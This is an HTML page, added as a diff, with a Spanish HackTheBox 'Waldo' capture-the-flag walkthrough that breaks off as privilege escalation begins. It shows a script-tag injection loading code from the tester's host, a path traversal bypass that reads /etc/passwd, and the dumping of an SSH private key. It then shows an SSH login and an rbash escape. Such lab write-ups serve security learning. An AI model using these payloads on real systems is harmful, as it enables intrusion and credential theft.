@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Waldo (medium) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Waldo (medium)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/medium/2024/08/25/waldo.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/medium/2024/08/25/waldo.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-08-25T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Waldo (medium)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-08-25T00:00:00-06:00","datePublished":"2024-08-25T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Waldo (medium)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/medium/2024/08/25/waldo.html"},"url":"http://localhost:4000/hackthebox/machines/medium/2024/08/25/waldo.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Waldo (medium)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-08-25T00:00:00-06:00" itemprop="datePublished">
+        Aug 25, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/de5b8119858c9c3ae0fcd4bf71587939.png" />
+</p>
+
+<ul>
+  <li>Waldo is a medium difficulty machine, which highlights the risk of insufficient input validation, provides the challenge of rbash escape or bypassing, and showcases an interesting privilege escalation vector involving Linux Capabilities, all of which may be found in real environments.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.10.87 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-08-25 11:08 CST
+Nmap scan report <span class="k">for </span>10.10.10.87
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e <span class="o">(</span>RSA<span class="o">)</span>
+|   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    nginx 1.12.2
+|_http-trane-info: Problem with XML parsing of /evox/about
+| http-title: List Manager
+|_Requested resource was /list.html
+|_http-server-header: nginx/1.12.2
+</code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Estas son las tecnologías que están corriendo en el servicio web.</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.87</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.87</span> <span class="p">[</span><span class="mi">302</span> <span class="no">Found</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.12</span><span class="o">.</span><span class="mi">2</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.87</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">7.1</span><span class="o">.</span><span class="mi">16</span><span class="p">],</span> <span class="no">RedirectLocation</span><span class="p">[</span><span class="sr">/list.html], X-Powered-By[PHP/</span><span class="mf">7.1</span><span class="o">.</span><span class="mi">16</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.12</span><span class="o">.</span><span class="mi">2</span><span class="p">]</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.87</span><span class="o">/</span><span class="n">list</span><span class="p">.</span><span class="nf">html</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.12</span><span class="o">.</span><span class="mi">2</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.87</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">List</span> <span class="no">Manager</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.12</span><span class="o">.</span><span class="mi">2</span><span class="p">]</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Esta es la pagina web.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/waldo/1.png" />
+</p>
+
+<ul>
+  <li>Vemos 2 listas y un botón de borrar si borramos una vemos que si se borra.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/waldo/2.png" />
+</p>
+
+<ul>
+  <li>Si presionamos en el botón de list2 nos muestra contenido.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/waldo/3.png" />
+</p>
+
+<ul>
+  <li>Si damos click en <code class="language-plaintext highlighter-rouge">PWN</code> nos deja editarla.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/waldo/4.png" />
+</p>
+
+<ul>
+  <li>Vamos añadir una nueva dando <code class="language-plaintext highlighter-rouge">click</code> en <code class="language-plaintext highlighter-rouge">add</code> y inyectar código <code class="language-plaintext highlighter-rouge">html</code> para ver si se refleja dentro de list 1.</li>
+</ul>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h1&gt;</span>hola<span class="nt">&lt;/h1&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que se refleja.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/waldo/5.png" />
+</p>
+
+<ul>
+  <li>Como se esta interpretando la etiqueta vamos a ejecutar un servidor http con python3 para ver si recibimos alguna petición.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a inyectar lo siguiente.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"http://10.10.14.23:8080/zi.js"</span><span class="o">&gt;</span>&lt;/script&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Bueno si esperamos varios minutos no recibimos nada así que descartamos posibles ataques mediante las etiquetas html de momento.</p>
+  </li>
+  <li>
+    <p>Vamos hacer Fuzzing para ver si encontramos nuevas rutas.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hl</span><span class="o">=</span>0 <span class="nt">-t</span> 200 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt http://10.10.10.87/list.html/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.87/list.html/FUZZ
+Total requests: 87664
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                        
+=====================================================================
+
+</span></code></pre></div></div>
+
+<h2 id="path-traversal">PATH Traversal</h2>
+
+<ul>
+  <li>No encontramos nada, vamos a capturar con <code class="language-plaintext highlighter-rouge">Burpsuite</code> la petición de la pagina web <code class="language-plaintext highlighter-rouge">http://10.10.10.87/list.html</code> para ver como esta todo por detrás.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ burpsuite &amp;&gt;/dev/null &amp; <span class="nb">disown</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Si también capturamos peticiones cuando damos en add vemos rutas nuevas.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/waldo/6.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Vamos a capturar la petición al acceder a alguna lista.</p>
+  </li>
+  <li>
+    <p>Vemos que apunta a otra ruta <code class="language-plaintext highlighter-rouge">.php</code> y vemos un <code class="language-plaintext highlighter-rouge">file=</code>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/waldo/7.png" />
+</p>
+
+<ul>
+  <li>Vamos a enviar la petición y vemos el contenido de lo que hay dentro.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/waldo/8.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Como tal tiene una estructura de directorios así que vamos a tratar de cargar el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> haciendo un <code class="language-plaintext highlighter-rouge">path traversal</code>.</p>
+  </li>
+  <li>
+    <p>Pero nada.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/waldo/9.png" />
+</p>
+
+<ul>
+  <li>Si aplicamos un pequeño Bypass vemos que funciona.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/waldo/10.png" />
+</p>
+
+<ul>
+  <li>Vemos al usuario nobody, operator y postgres con una sh.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://10.10.10.87/fileRead.php"</span> <span class="nt">-d</span> <span class="s1">'file=./.list/....//....//....//....//....//....//etc/passwd'</span> | jq <span class="s1">'.["file"]'</span> <span class="nt">-r</span> | <span class="nb">grep</span> <span class="s2">"sh$"</span>
+root:x:0:0:root:/root:/bin/ash
+operator:x:11:0:operator:/root:/bin/sh
+postgres:x:70:70::/var/lib/postgresql:/bin/sh
+nobody:x:65534:65534:nobody:/home/nobody:/bin/sh
+</code></pre></div></div>
+
+<ul>
+  <li>Si enumeramos su directorio personal encontramos su clave privada dentro de la carpeta .ssh.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://10.10.10.87/fileRead.php"</span> <span class="nt">-d</span> <span class="s1">'file=./.list/....//....//....//....//....//....//home/nobody/.ssh/.monitor'</span> | jq <span class="s1">'.["file"]'</span> <span class="nt">-r</span>
+<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl
+mR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f
+87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS
+dGCc/gNpW/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN
+o8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8/6pceowqs9ujRkNzH9T1lJq4Fx1V
+vi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl/wdmuPEW6kU
+vmzhRU3gcjuzwBET0TNejbL/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR/6
+pKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5
+8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q
+1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox/05qoOBL4kQxUM7
+VxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS
+dVa3yLECgYEA7jk51MvUGSIFF6GkXsNb/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO
+v0og0X/iROXAcp6Z9WGpIc6FhVgJd/4bNlTR+A/lWQwFt1b6l03xdsyaIyIWi9xr
+xsb2sLNWP56A/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY
+qFfdAWrvVZjp26Yf/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI
+yzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1
+/pAcw/+/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw/IMnLa3drm3CIAa32iU
+LRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ/
+lnN2n1WyTIyEuGA/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp
+w7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9
+1HLmBkDTjjj/xAJAZuiOF4Rs/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT
+rj1BhUCzZCUgQABtpC6vYj/HLLlzpiC05AIEhDdvToPK/0WuY64fds0VccAYmMDr
+X/PlAoGAS6UhbCm5TWZhtL/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2
+DvVny8gKbM/OenwHnTlwRTEj5qdeAM40oj/mwCDc6kpV1lJXrW2R5mCH9zgbNFla
+W0iKCBUAm5xZgU/YskMsCBMNmA8A5ndRWGFEFE+VGDVPaRie0ro<span class="o">=</span>
+<span class="nt">-----END</span> RSA PRIVATE KEY-----
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nano id_rsa
+❯ <span class="nb">chmod </span>600 id_rsa
+</code></pre></div></div>
+
+<h2 id="shell-as-nobody">Shell as nobody</h2>
+
+<ul>
+  <li>Ahora nos conectamos por ssh.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh <span class="nt">-i</span> id_rsa nobody@10.10.10.87
+The authenticity of host <span class="s1">'10.10.10.87 (10.10.10.87)'</span> can<span class="s1">'t be established.
+ED25519 key fingerprint is SHA256:V+5vDo94JYcOMESxNxxs0je359eF2cxyHZS7vQtBQ1A.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.10.87<span class="s1">' (ED25519) to the list of known hosts.
+Welcome to Alpine!
+
+The Alpine Wiki contains a large amount of how-to guides and general
+information about administrating Alpine systems.
+See &lt;http://wiki.alpinelinux.org&gt;.
+waldo:~$ whoami
+nobody
+waldo:~$ 
+</span></code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<ul>
+  <li>Podemos ver la primer flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+cccbc59b1b8a9965f7eac3e8ebfa8529
+waldo:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>No vemos nada interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
+./usr/bin/passwd
+./usr/bin/chage
+./usr/bin/expiry
+./usr/bin/chfn
+./usr/bin/chsh
+./usr/bin/newgrp
+./usr/bin/gpasswd
+waldo:/<span class="nv">$ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>El PATH que tenemos es muy pequeño así que vamos a exportar el de nosotros.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:/<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+waldo:/<span class="nv">$ </span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:/<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/miguelrega7/
+.fzf/bin
+waldo:/<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/miguelrega7/.fzf/bin
+waldo:/<span class="nv">$ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>Si nos vamos al directorio <code class="language-plaintext highlighter-rouge">.ssh</code> vemos que la clave le pertenece al usuario monitor.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:~/.ssh<span class="nv">$ </span><span class="nb">cat </span>authorized_keys <span class="p">;</span> <span class="nb">echo
+</span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM/VNgdz7ijwPfraXk3B/oKmWZHgkfqfg1xx2bVlT6oHvuWLxk6/KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp/zuzQVkGFgCLMas014suEHUhkiOkNUlRtJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbBVeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz/qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+arOD6NJOFJY4jBHvf monitor@waldo
+waldo:~/.ssh<span class="nv">$ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>Si nos conectamos por SSH vemos que estamos en una <code class="language-plaintext highlighter-rouge">restricted bash</code> <a href="https://weblinus.com/como-restringir-la-shell-de-usuario-con-rbash/">https://weblinus.com/como-restringir-la-shell-de-usuario-con-rbash/</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:~/.ssh<span class="nv">$ </span>ssh <span class="nt">-i</span> .monitor monitor@localhost
+Linux waldo 4.19.0-25-amd64 <span class="c">#1 SMP Debian 4.19.289-2 (2023-08-08) x86_64</span>
+           &amp;.                                                                  
+          @@@,@@/ %                                                            
+       <span class="c">#*/%@@@@/.&amp;@@,                                                          </span>
+   @@@#@@#&amp;@#&amp;#&amp;@@@,<span class="k">*</span>%/                                                        
+   /@@@&amp;###########@@&amp;<span class="k">*</span><span class="o">(</span><span class="k">*</span>                                                      
+ <span class="o">(</span>@################%@@@@@.     /<span class="k">**</span>                                             
+ @@@@&amp;#############%@@@@@@@@@@@@@@@@@@@@@@@@%<span class="o">((</span>/                               
+ %@@@@%##########&amp;@@@....                 .#%#@@@@@@@#                         
+ @@&amp;%#########@@@@/                        <span class="k">*</span>/@@@%<span class="o">(((</span>@@@%                       
+    @@@#%@@%@@@,                       <span class="k">*</span>&amp;@@@&amp;%<span class="o">(((</span><span class="c">#((((@@(                      </span>
+     /<span class="o">(</span>@@@@@@@                     <span class="k">*</span>&amp;@@@@%<span class="o">((((((((((((</span><span class="c">#@@(                     </span>
+       %/#@@@/@ @#/@          ..@@@@%<span class="o">(((((((((((</span><span class="c">#((#@@@@@@@@@@@@&amp;#,            </span>
+          %@<span class="k">*</span><span class="o">(</span>@#%@.,       /@@@@&amp;<span class="o">(((((((((((((((</span>&amp;@@@@@@&amp;#######%%@@@@#    &amp;    
+        <span class="k">*</span>@@@@@#        .&amp;@@@#<span class="o">(((</span><span class="c">#(#((((((((#%@@@@@%###&amp;@@@@@@@@@&amp;%##&amp;@@@@@@/   </span>
+       /@@          <span class="c">#@@@&amp;#(((((((((((#((@@@@@%%%%@@@@%#########%&amp;@@@@@@@@&amp;     </span>
+      <span class="k">*</span>@@      <span class="k">*</span>%@@@@#<span class="o">((((((((((((((</span><span class="c">#@@@@@@@@@@%####%@@@@@@@@@@@@###&amp;@@@@@@@&amp;  </span>
+      %@/ .&amp;%@@%#<span class="o">(((((((((((((((</span><span class="c">#@@@@@@@&amp;#####%@@@%#############%@@@&amp;%##&amp;@@/   </span>
+      @@@@@@%<span class="o">(((((((((((</span><span class="c">##(((@@@@&amp;%####%@@@%#####&amp;@@@@@@@@@@@@@@@&amp;##&amp;@@@@@@@@@/</span>
+     @@@&amp;<span class="o">(((</span><span class="c">#((((((((((((#@@@@@&amp;@@@@######@@@###################&amp;@@@&amp;#####%@@* </span>
+     @@#<span class="o">(((((((((((((</span><span class="c">#@@@@%&amp;@@.,,.*@@@%#####@@@@@@@@@@@@@@@@@@@%####%@@@@@@@@@@</span>
+     <span class="k">*</span>@@%<span class="o">((((((((</span><span class="c">#@@@@@@@%#&amp;@@,,.,,.&amp;@@@#####################%@@@@@@%######&amp;@@.</span>
+       @@@#<span class="o">(</span><span class="c">#&amp;@@@@@&amp;##&amp;@@@&amp;#@@/,,,,,,,,@@@&amp;######&amp;@@@@@@@@&amp;&amp;%######%@@@@@@@@@@@</span>
+        @@@@@@&amp;%&amp;@@@%#&amp;@%%@@@@/,,,,,,,,,,/@@@@@@@#/,,.<span class="k">*</span>&amp;@@%&amp;@@@@@@&amp;%#####%@@@@.
+          .@@@###&amp;@@@%%@<span class="o">(</span>,,,%@&amp;,.,,,,,,,,,,,,,.<span class="k">*</span>&amp;@@@@&amp;<span class="o">(</span>,<span class="k">*</span>@&amp;#@%%@@@@@@@@@@@@<span class="k">*</span>   
+            @@%##%@@/@@@%/@@@@@@@@@#,,,,.../@@@@@%#%&amp;@@@@<span class="o">(</span>&amp;@&amp;@&amp;@@@@<span class="o">(</span>           
+            .@@&amp;##@@,,/@@@@&amp;<span class="o">(</span><span class="nb">.</span>  .&amp;@@@&amp;,,,.&amp;@@/         <span class="c">#@@%@@@@@&amp;@@@/          </span>
+           <span class="k">*</span>@@@@@&amp;@@.<span class="k">*</span>@@@          %@@@<span class="k">*</span>,&amp;@@            <span class="k">*</span>@@@@@&amp;.#/,@/          
+          <span class="k">*</span>@@&amp;<span class="k">*</span><span class="c">#@@@@@@@&amp;     #@(    .@@@@@@&amp;    ,@@@,    @@@@@(,@/@@           </span>
+          <span class="k">*</span>@@/@#.#@@@@@/    %@@@,   .@@&amp;%@@@     &amp;@&amp;     @@<span class="k">*</span>@@<span class="k">*</span><span class="o">(</span>@@#            
+           <span class="o">(</span>@@/@,,@@&amp;@@@            &amp;@@,,<span class="o">(</span>@@&amp;          .@@%/@@,@@              
+             /@@@<span class="k">*</span>,@@,@@@<span class="k">*</span>         @@@,,,,,@@@@.     <span class="k">*</span>@@@%,@@<span class="k">**</span>@#              
+               %@@.%@&amp;,<span class="o">(</span>@@@@,  /&amp;@@@@,,,,,,,%@@@@@@@@@@%,,<span class="k">*</span>@@,#@,              
+                ,@@,&amp;@,,,,<span class="o">(</span>@@@@@@@<span class="o">(</span>,,,,,.,,,,,,,,<span class="k">**</span>,,,,,,.<span class="k">*</span>@/,&amp;@               
+                 &amp;@,<span class="k">*</span>@@.,,,,,..,,,,&amp;@@%/<span class="k">**</span>/@@<span class="k">*</span>,,,,,&amp;<span class="o">(</span>.,,,.@@,,@@               
+                 /@%,&amp;@/,,,,/@%,,,,,<span class="k">*</span>&amp;@@@@@#.,,,,,.@@@<span class="o">(</span>,,<span class="o">(</span>@@@@@<span class="o">(</span>               
+                  @@<span class="k">*</span>,@@,,,#@@@&amp;<span class="k">*</span>..,,,,,,,,,,,,/@@@@,<span class="k">*</span><span class="o">(</span>,,&amp;@/#<span class="k">*</span>                 
+                  <span class="k">*</span>@@@@@<span class="o">(</span>,,@<span class="k">*</span>,%@@@@@@@&amp;&amp;#%@@@@@@@/,,,,,,,@@                    
+                       @@<span class="k">*</span>,,,,,,,,,.<span class="k">*</span>/<span class="o">(</span>//<span class="k">*</span>,..,,,,,,,,,,,&amp;@,                    
+                        @@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                     
+                        &amp;@&amp;,,,,,,,,,,,,,,,,,,,,,,,,,,,,&amp;@#                     
+                         %@<span class="o">(</span>,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                      
+                         ,@@,,,,,,,,@@@&amp;&amp;&amp;%&amp;@,,,,,..,,@@,                      
+                          <span class="k">*</span>@@,,,,,,,.,<span class="k">****</span>,..,,,,,,,,&amp;@@                       
+                           <span class="o">(</span>@<span class="o">(</span>,,,.,,,,,,,,,,,,,,.,,,/@@                        
+                           .@@,,,,,,,,,,,,,...,,,,,,@@                         
+                            ,@@@,,,,,,,,,,,,,,,,.<span class="o">(</span>@@@                          
+                              %@@@@&amp;<span class="o">(</span>,,,,<span class="k">*</span><span class="o">(</span><span class="c">#&amp;@@@@@@,     </span>
+                              
+                            Here<span class="s1">'s Waldo, where'</span>s root?
+Last login: Tue Dec  5 06:02:39 2023 from 127.0.0.1
+<span class="nt">-rbash</span>: <span class="nb">alias</span>: <span class="nb">command </span>not found
+monitor@waldo:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>Bueno para salir simplemente hacemos lo siguiente.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>waldo:~/.ssh<span class="nv">$ </span>ssh <span class="nt">-i</span> .monitor monitor@localhost bash
+<span class="nb">whoami
+</span>monitor
+script /dev/null <span class="nt">-c</span> bash
+Script started, file is /dev/null
+monitor@waldo:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<ul>
+  <li>Ahora nuevamente exportamos nuestro PATH.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>monitor@waldo:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/miguelrega7/.fzf/bin
+&lt;r/local/games:/usr/games:/home/miguelrega7/.fzf/bin
+monitor@waldo:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
